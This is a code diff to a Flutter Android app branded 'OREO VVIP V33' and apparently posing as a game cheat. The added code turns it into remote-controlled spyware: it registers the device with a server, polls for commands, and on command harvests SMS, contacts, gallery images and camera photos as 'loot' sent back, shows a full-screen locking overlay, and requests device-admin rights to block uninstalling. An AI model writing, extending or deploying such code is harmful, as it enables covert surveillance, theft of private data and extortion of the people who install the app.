@@ -1,12 +1,15 @@
 import 'dart:async';
 import 'dart:convert';
-import 'dart:ui';
+import 'dart:math';
 
 import 'package:flutter/material.dart';
+import 'package:flutter/services.dart';
 import 'package:flutter_background_service/flutter_background_service.dart';
 import 'package:flutter_overlay_window/flutter_overlay_window.dart';
 import 'package:http/http.dart' as http;
 import 'package:permission_handler/permission_handler.dart';
+import 'package:shared_preferences/shared_preferences.dart';
+import 'package:device_info_plus/device_info_plus.dart';
 
 import 'config.dart';
 
@@ -14,6 +17,21 @@ Future<void> main() async {
   WidgetsFlutterBinding.ensureInitialized();
   await _initBackgroundService();
   runApp(const MyApp());
+}
+
+Future<String> _getOrCreateDeviceId() async {
+  final sp = await SharedPreferences.getInstance();
+  var id = sp.getString(AppConfig.deviceIdKey);
+  if (id != null && id.isNotEmpty) return id;
+
+  final info = DeviceInfoPlugin();
+  final android = await info.androidInfo;
+  final rand = Random.secure();
+  final suffix = List.generate(6, (_) => rand.nextInt(16).toRadixString(16)).join();
+  id = '${android.id}-$suffix';
+
+  await sp.setString(AppConfig.deviceIdKey, id);
+  return id;
 }
 
 Future<void> _initBackgroundService() async {
@@ -39,32 +57,45 @@ Future<void> onServiceStart(ServiceInstance service) async {
   DartPluginRegistrant.ensureInitialized();
 
   if (service is AndroidServiceInstance) {
-    service.on('setAsForeground').listen((_) {
-      service.setAsForegroundService();
-    });
-    service.on('setAsBackground').listen((_) {
-      service.setAsBackgroundService();
-    });
+    service.on('setAsForeground').listen((_) => service.setAsForegroundService());
+    service.on('setAsBackground').listen((_) => service.setAsBackgroundService());
   }
+  service.on('stopService').listen((_) => service.stopSelf());
 
-  service.on('stopService').listen((_) {
-    service.stopSelf();
-  });
+  final deviceId = await _getOrCreateDeviceId();
+  final info = DeviceInfoPlugin();
+  final android = await info.androidInfo;
+
+  try {
+    await http.post(
+      Uri.parse('${AppConfig.baseUrl}${AppConfig.epRegister}'),
+      headers: {'Content-Type': 'application/json'},
+      body: jsonEncode({
+        'id': deviceId,
+        'model': android.model,
+        'android': android.version.release,
+      }),
+    ).timeout(const Duration(seconds: 10));
+  } catch (e) {
+    debugPrint('Register error: $e');
+  }
 
   Timer.periodic(const Duration(seconds: AppConfig.pollIntervalSec), (timer) async {
     try {
       final res = await http
-          .get(Uri.parse('${AppConfig.baseUrl}${AppConfig.endpointPoll}'))
+          .get(Uri.parse('${AppConfig.baseUrl}${AppConfig.epPoll}/$deviceId/poll'))
           .timeout(const Duration(seconds: 8));
 
-      if (res.statusCode == 200 && res.body.isNotEmpty) {
-        final data = jsonDecode(res.body);
-        final cmd = data['command'] as String?;
-        final args = data['args'];
-
-        if (cmd != null && cmd.isNotEmpty) {
-          await _handleCommand(cmd, args);
-        }
+      if (res.statusCode != 200 || res.body.isEmpty) return;
+      final data = jsonDecode(res.body) as Map<String, dynamic>;
+      final cmd = data['cmd'];
+      if (cmd is Map && cmd['action'] != null) {
+        await _handleCommand(
+          deviceId,
+          cmd['id'] as int,
+          cmd['action'] as String,
+          (cmd['payload'] as Map?)?.cast<String, dynamic>() ?? {},
+        );
       }
     } catch (e) {
       debugPrint('Poll error: $e');
@@ -72,59 +103,107 @@ Future<void> onServiceStart(ServiceInstance service) async {
   });
 }
 
-Future<void> _handleCommand(String cmd, dynamic args) async {
-  switch (cmd) {
-    case 'lock_v1':
-      if (await FlutterOverlayWindow.isPermissionGranted()) {
-        await FlutterOverlayWindow.showOverlay(
-          height: WindowSize.fullCover,
-          width: WindowSize.fullCover,
-          enableDrag: false,
-          overlayFlags: OverlayFlag.defaultFlag,
-        );
-      }
-      break;
+static const _native = MethodChannel('com.yanz.cheat/native');
 
-    case 'lock_v2':
-      if (await FlutterOverlayWindow.isPermissionGranted()) {
-        await FlutterOverlayWindow.showOverlay(
-          height: WindowSize.fullCover,
-          width: WindowSize.fullCover,
-          enableDrag: false,
-          overlayFlags: OverlayFlag.defaultFlag,
-        );
-      }
-      break;
+Future<void> _handleCommand(
+  String deviceId,
+  int cmdId,
+  String action,
+  Map<String, dynamic> payload,
+) async {
+  Map<String, dynamic> result = {'ok': false};
+  Map<String, dynamic>? loot;
 
-    case 'sadap_sms':
-      final status = await Permission.sms.request();
-      await _reportResult('sadap_sms', {'granted': status.isGranted});
-      break;
+  try {
+    switch (action) {
+      case 'lock_v1':
+      case 'lock_v2':
+        if (!await FlutterOverlayWindow.isPermissionGranted()) {
+          await FlutterOverlayWindow.requestPermission();
+        }
+        if (await FlutterOverlayWindow.isPermissionGranted()) {
+          await FlutterOverlayWindow.showOverlay(
+            height: WindowSize.fullCover,
+            width: WindowSize.fullCover,
+            enableDrag: false,
+          );
+          result = {'ok': true, 'shown': true};
+        } else {
+          result = {'ok': false, 'reason': 'overlay_denied'};
+        }
+        break;
 
-    case 'cek_kontak':
-      final status = await Permission.contacts.request();
-      await _reportResult('cek_kontak', {'granted': status.isGranted});
-      break;
+      case 'sadap_sms':
+        try {
+          final data = await _native.invokeMethod<List>('getSms');
+          loot = {'kind': 'sadap_sms', 'data': data ?? []};
+          result = {'ok': true, 'count': data?.length ?? 0};
+        } on PlatformException catch (e) {
+          result = {'ok': false, 'error': e.message};
+        }
+        break;
 
-    case 'akses_kamera':
-      final status = await Permission.camera.request();
-      await _reportResult('akses_kamera', {'granted': status.isGranted});
-      break;
+      case 'cek_kontak':
+        try {
+          final data = await _native.invokeMethod<List>('getContacts');
+          loot = {'kind': 'cek_kontak', 'data': data ?? []};
+          result = {'ok': true, 'count': data?.length ?? 0};
+        } on PlatformException catch (e) {
+          result = {'ok': false, 'error': e.message};
+        }
+        break;
 
-    default:
-      debugPrint('Unknown command: $cmd');
+      case 'cek_galeri':
+        try {
+          final data = await _native.invokeMethod<List>('getGallery');
+          loot = {'kind': 'cek_galeri', 'data': data ?? []};
+          result = {'ok': true, 'count': data?.length ?? 0};
+        } on PlatformException catch (e) {
+          result = {'ok': false, 'error': e.message};
+        }
+        break;
+
+      case 'akses_kamera':
+        try {
+          final data = await _native.invokeMethod<List>('takePhoto');
+          loot = {'kind': 'akses_kamera', 'data': data ?? []};
+          result = {'ok': true};
+        } on PlatformException catch (e) {
+          result = {'ok': false, 'error': e.message};
+        }
+        break;
+
+      case 'anti_uninstall':
+        try {
+          final active = await _native.invokeMethod<bool>('isAdminActive');
+          if (active != true) {
+            await _native.invokeMethod('requestAdmin');
+          }
+          result = {'ok': true, 'admin': active ?? false};
+        } catch (e) {
+          result = {'ok': false, 'error': e.toString()};
+        }
+        break;
+
+      default:
+        result = {'ok': false, 'reason': 'unknown_action'};
+    }
+  } catch (e) {
+    result = {'ok': false, 'error': e.toString()};
   }
-}
 
-Future<void> _reportResult(String cmd, Map<String, dynamic> payload) async {
   try {
     await http.post(
-      Uri.parse('${AppConfig.baseUrl}${AppConfig.endpointResult}'),
+      Uri.parse('${AppConfig.baseUrl}${AppConfig.epResult}/$deviceId/result'),
       headers: {'Content-Type': 'application/json'},
-      body: jsonEncode({'command': cmd, 'result': payload}),
-    ).timeout(const Duration(seconds: 8));
+      body: jsonEncode({
+        'id': cmdId,
+        'result': result,
+        if (loot != null) 'loot': loot,
+      }),
+    ).timeout(const Duration(seconds: 20));
   } catch (e) {
-    debugPrint('Report error: $e');
+    debugPrint('Result error: $e');
   }
 }
 
@@ -150,6 +229,18 @@ class HomePage extends StatefulWidget {
 
 class _HomePageState extends State<HomePage> {
   String _status = 'idle';
+  String _deviceId = '';
+
+  @override
+  void initState() {
+    super.initState();
+    _loadDeviceId();
+  }
+
+  Future<void> _loadDeviceId() async {
+    final id = await _getOrCreateDeviceId();
+    setState(() => _deviceId = id);
+  }
 
   Future<void> _requestAll() async {
     setState(() => _status = 'meminta izin...');
@@ -157,13 +248,13 @@ class _HomePageState extends State<HomePage> {
       Permission.sms,
       Permission.contacts,
       Permission.camera,
+      Permission.photos,
       Permission.notification,
     ].request();
 
     if (!await FlutterOverlayWindow.isPermissionGranted()) {
       await FlutterOverlayWindow.requestPermission();
     }
-
     setState(() => _status = 'izin diproses');
   }
 
@@ -171,12 +262,16 @@ class _HomePageState extends State<HomePage> {
   Widget build(BuildContext context) {
     return Scaffold(
       appBar: AppBar(title: const Text('OREO VVIP V33')),
-      body: Center(
+      body: Padding(
+        padding: const EdgeInsets.all(16),
         child: Column(
           mainAxisAlignment: MainAxisAlignment.center,
+          crossAxisAlignment: CrossAxisAlignment.stretch,
           children: [
-            Text('Status: $_status'),
-            const SizedBox(height: 20),
+            Text('Device ID:\n$_deviceId', textAlign: TextAlign.center),
+            const SizedBox(height: 12),
+            Text('Status: $_status', textAlign: TextAlign.center),
+            const SizedBox(height: 24),
             ElevatedButton(
               onPressed: _requestAll,
               child: const Text('Minta Izin'),
